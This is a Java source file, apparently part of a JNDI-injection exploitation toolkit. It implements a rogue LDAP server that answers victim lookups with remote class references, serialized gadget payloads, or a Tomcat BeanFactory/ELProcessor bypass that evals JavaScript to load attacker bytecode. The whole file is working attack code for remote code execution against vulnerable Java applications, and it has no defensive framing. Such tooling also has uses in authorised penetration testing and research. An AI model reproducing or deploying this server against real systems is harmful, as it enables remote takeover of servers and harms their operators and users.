package com.example.exploit.server;

import com.example.exploit.Dispatcher;
import com.example.exploit.util.MiscUtil;
import com.example.exploit.util.SerializeUtil;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.util.Arrays;
import java.util.Base64;
import java.util.Hashtable;

public class LdapServer implements Runnable {
    private String host;
    private String httpAddr;
    private int port;

    public LdapServer(String host, int port, String httpAddr) {
        this.host = host;
        this.port = port;
        this.httpAddr = httpAddr;
    }

    @Override
    public void run() {

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName(host),
                    this.port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(this.httpAddr));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("[LDAP] Listening on " + host + ":" + port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private String httpAddr;

        public OperationInterceptor(String httpAddr) {
            this.httpAddr = httpAddr;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {

            String codebase = "http://" + this.httpAddr + "/";
            String[] arr = base.split(",");
            String route = "/" + arr[0];
            String type = arr[0].split("/")[0];

            Hashtable<String, String> params = new Hashtable<>();

            for (String v : Arrays.copyOfRange(arr, 1, arr.length)) {
                String[] kv = v.split("=", 2);
                params.put(kv[0], kv[1]);
            }

            if ("Ref".equals(type)) {
                System.out.println("[LDAP] Send reference result for " + route);

                String className = "Exploit_" + MiscUtil.getRandStr(12);
                params.put("className", className);

                byte[] data = Dispatcher.dispatch(route, params);

                if ("tomcat".equals(params.get("bypass"))) {
                    System.out.println("[LDAP] Bypass: Tomcat");

                    String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(data) + "');\n" +
                            "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                            "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                            "method.setAccessible(true);\n" +
                            "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                            "clazz.newInstance();";
                    ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
                    ref.add(new StringRefAddr("forceString", "x=eval"));
                    ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")"));

                    e.addAttribute("javaClassName", "foo");
                    e.addAttribute("javaSerializedData", SerializeUtil.serialize(ref));
                } else {
                    WebServer.httpServer.createContext("/" + className + ".class", new FileHandler(data));

                    e.addAttribute("javaClassName", "foo");
                    e.addAttribute("javaCodeBase", codebase);
                    e.addAttribute("objectClass", "javaNamingReference");
                    e.addAttribute("javaFactory", className);
                }
            } else if ("Deserialize".equals(type)) {
                System.out.println("[LDAP] Send Serialized Data");

                byte[] data = Dispatcher.dispatch(route, params);
                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaSerializedData", data);
            } else {
                System.out.println("[LDAP] Invalid type: " + type);
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
